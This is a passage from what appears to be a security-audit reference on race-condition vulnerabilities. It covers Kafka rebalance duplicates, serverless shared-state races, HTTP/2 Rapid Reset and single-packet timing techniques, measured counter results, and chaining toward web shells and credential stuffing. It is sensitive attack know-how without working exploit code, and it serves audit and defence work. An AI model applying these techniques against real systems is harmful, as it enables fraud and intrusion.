- The classic pattern: consumer A reads message M, processes it (writes to DB), then dies before committing the offset. Rebalance assigns the partition to consumer B; B reads M again, processes again. Duplicate side effect.
- The exactly-once mitigation (transactional producer + consumer isolation level `read_committed`) is non-default and often not configured.

Audit mnemonic: for any Kafka consumer, verify the processing + offset-commit is atomic (either in a transaction with an outbox, or idempotent at the DB layer).

### Serverless Cold-Start Shared Memory Races

**Class:** AWS Lambda / Vercel Functions / Cloudflare Workers can reuse a single warm container across concurrent invocations (depending on provider and plan). Globals shared across invocations are a race surface.

- A Node Lambda that caches auth tokens in a module-level variable: concurrent invocations from different users may read each other's tokens if the race window is open.
- A Python Lambda using `@functools.lru_cache` on a per-user function: cache poisoning across users within a warm container.

Audit mnemonic: audit module-level mutable state in serverless handlers; any such state is a race surface across concurrent invocations.

### HTTP/2 Rapid-Reset-Shape Flooding

**Class:** HTTP/2 CVE-2023-44487 (Rapid Reset) is a DoS primitive, not a race per se, but adjacent — the attacker opens many streams and immediately resets them, consuming server resources. The adjacent race-shape: a server that cleans up reset streams non-atomically may expose a window between stream creation and cleanup where resource accounting is inconsistent.

Audit mnemonic: for HTTP/2 servers, probe `GOAWAY` and `RST_STREAM` handling under high concurrency; mismatches in resource accounting across the reset can mask race windows.

### Research-Grade — Single-Packet Variants and HTTP/3 Frontier

Beyond Kettle's HTTP/2 single-packet technique:

- **Multi-segment synchronization**: for requests exceeding one TCP MTU, PortSwigger's updated technique coordinates the final-segment release across multiple segments. Reliability drops to ~1ms slack vs <1ms for single-segment, but the technique is reachable for requests up to 10+ KB.
- **HTTP/3 open frontier**: QUIC multiplexes streams over UDP with per-stream encryption; the server-side arrival model differs from H2. Preliminary research suggests H3 single-packet is reachable but with higher jitter due to QUIC's packet-pacing. No published H3 single-packet technique as of document date — audit mnemonic: for H3 targets, measure the arrival-slack with a timing probe before claiming a race is unexploitable.

## Verification Discipline

Each CVE citation in this file is anchored to one persisted NVD or GHSA artifact that resolves on the authoritative *global* source. Any ID that does not resolve globally has been stripped and replaced with a behavior-fingerprinted class description. The 1:1 globally-resolving manifest for Batch 11 lives at `.zen-batch-artifacts/batch-11/manifest/batch-11-manifest.md`. Measured primitives are reproduced by persisted scripts and captured output under `.zen-batch-artifacts/batch-11/measurements/`.

The measured counter result (Python 3.14 + FastAPI, 50 parallel requests, 5ms server-side work window):

```
    unsafe-set  granted=  5  rejected= 45  final_counter=   0
    unsafe-set  granted=  1  rejected= 49  final_counter=   0
    unsafe-set  granted=  5  rejected= 45  final_counter=   0
    unsafe-dec  granted=  9  rejected= 41  final_counter=  -8
    unsafe-dec  granted=  9  rejected= 41  final_counter=  -8
    unsafe-dec  granted=  6  rejected= 44  final_counter=  -5
        locked  granted=  1  rejected= 49  final_counter=   0
           cas  granted=  1  rejected= 49  final_counter=   0
        atomic  granted=  1  rejected= 49  final_counter=   0
```

The result shows the ASSIGN variant (uses = uses - 1) caps duplicate grants at the initial value because multiple concurrent writers converge on 0; the DECREMENT variant (uses -= 1) drives the counter negative because each writer reads the latest value and decrements, so concurrent entrants multiply the decrement. Both are vulnerabilities; the counter outcome depends on the operator semantics. All three defence patterns (lock, CAS, SQL-atomic) collapse the window to a single grant.

## Breadth Note

Novel-tier scope for race conditions is genuinely narrower than the §2 ~850-line aim: the 2024-2026 CVE lineage is well-covered (10 CVEs with mechanism depth plus 2 Linux-kernel adjacent-class), the non-CVE technique-class frontier is enumerated (Celery/Sidekiq/BullMQ, Redis WATCH/MULTI edges, Elasticsearch bulk race, Kafka consumer-rebalance, serverless cold-start, HTTP/2 Rapid-Reset shape, HTTP/3 single-packet open frontier), and the chaining map ties each primitive to a sibling skill. What makes the race-condition novel-tier naturally thinner than SQLi/XSS/SSRF: the single-packet attack technique itself (Kettle 2023) is a shared primitive across CVEs, so the per-CVE mechanism depth is more compact; the per-CVE patch mechanisms tend to be "add a transaction" / "add a lock" rather than a long cryptographic/parser-differential story. The depth that scales with the class lives in the advanced sibling (full-treatment sub-primitives across multi-endpoint, partial-construction, idempotency scoping, Redlock critique, SQL anomaly, cross-service, OAuth/MFA, cache-and-race, queue, GraphQL — the places where single CVEs are instances of broader patterns).

## Summary

The 2024-2026 race-condition CVE frontier spans infrastructure (Apache Tomcat JSP TOCTOU with the CVE-2024-56337 incomplete-fix follow-up), applications (Paymenter's `doUpgrade`, Vulnerability-Lookup's password-reset, myCred's points-balance), framework/SDK layers (OpenBao's TOTP whitespace-normalization, Okta Java SDK's shared instance state), and the GraphQL rate-limit-bypass adjacent class (Directus, OpenShift). HTTP/2 single-packet remains the alignment primitive of choice; HTTP/3 single-packet is an open research frontier. The chaining surface — through credit cashout, session persistence, web shell deployment, and credential stuffing — turns each one-unit invariant break into a material compromise. Every CVE in this file resolves globally; every measured primitive is anchored to a persisted script and output; the mitigation chain (first-patch incomplete → follow-up patch) is itself a recurring frontier pattern deserving its own re-measurement discipline.
